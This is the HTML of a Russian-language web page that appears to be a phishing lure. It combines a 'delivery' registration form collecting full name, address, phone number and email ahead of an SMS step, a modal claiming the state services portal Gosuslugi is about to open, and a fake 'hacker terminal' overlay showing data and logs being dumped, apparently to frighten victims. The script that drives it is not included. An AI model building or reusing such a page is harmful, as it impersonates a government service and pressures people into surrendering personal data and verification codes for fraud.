<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Форма регистрации</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- ЭКРАН 1: Первичный прелоадер -->
    <div id="sitePreloader" class="preloader">
        <div class="spinner"></div>
        <div class="preloader-text">Инициализация сервиса...</div>
    </div>

    <!-- ЭКРАН ХАКЕРСКОГО ТЕРМИНАЛА (Выгрузка логов) -->
    <div id="hackerModal" class="hacker-overlay">
        <div class="hacker-window">
            <div class="hacker-header">
                <div class="window-buttons">
                    <span class="btn-dot close"></span>
                    <span class="btn-dot min"></span>
                    <span class="btn-dot max"></span>
                </div>
                <div class="hacker-title">root@system_core:~ log_dumper_v2.04</div>
            </div>
            <div class="hacker-body">
                <div id="terminalConsole" class="terminal-console"></div>
                <div class="hacker-progress-container">
                    <div class="progress-info">
                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar-bg">
                        <div id="progressBarFill" class="progress-bar-fill"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ЭКРАН 3: Модальное окно загрузки профиля -->
    <div id="profileLoaderOverlay" class="modal-overlay">
        <div class="top-logo-container">
            <img src="flags/logo.png" alt="Test Logo" class="top-logo">
        </div>

        <div class="status-card">
            <h3 class="status-title">Госуслуги сейчас откроются</h3>
            <p class="status-subtitle">Портал работает в прежнем режиме.<br>Подождите пару секунд</p>
            
            <div class="dots-container">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </div>
        </div>
    </div>

    <!-- ЭКРАН 2: Основной интерфейс -->
    <div class="page-wrapper" id="mainContent">
        <div class="card active">
            <div class="logo-container">
                <img src="" alt="">
            </div>
            
            <h2>Регистрация пользователя</h2>
            
            <div class="form-group">
                <label>ФИО</label>
                <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
            </div>

            <div class="form-group">
                <label>Адрес доставки</label>
                <input type="text" id="fullAddress" placeholder="г. Москва, ул. Ленина, д. 10" required>
            </div>

            <div class="form-group">
                <label>Номер телефона</label>
                <div class="phone-input-group">
                    <div class="custom-select-wrapper" id="countrySelectWrapper">
                        <div class="custom-select-trigger" id="countrySelectTrigger">
                            <span id="selectedCode">+7</span>
                        </div>
                    </div>
                    <input type="tel" id="phoneNumber" placeholder="123-456-78-90" required>
                </div>
            </div>

            <div class="form-group">
                <label>E-mail адрес</label>
                <input type="email" id="emailInput" placeholder="ivanov@example.com" required>
            </div>

            <button id="getSmsBtn" class="btn-green">Продолжить</button>
        </div>
    </div>

    <div id="toastContainer" class="toast-container"></div>
    <script src="script.js"></script>
</body>
</html>
